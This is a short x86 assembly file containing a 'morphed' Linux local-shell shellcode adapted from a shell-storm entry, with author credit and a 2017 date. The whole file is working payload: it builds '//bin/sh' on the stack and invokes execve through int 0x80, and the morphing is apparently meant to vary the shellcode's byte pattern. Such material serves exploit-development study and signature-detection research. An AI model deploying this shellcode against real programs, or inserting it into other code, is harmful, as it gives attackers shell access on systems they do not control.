; Content:	morphed code (local shell) from http://shell-storm.org/shellcode/files/shellcode-517.php
; Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
; Date: 	10/2017
;

global _start

_start:
	xor ecx, ecx
	mul ecx
	push ecx
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	mov al, 0xb
	int 0x80

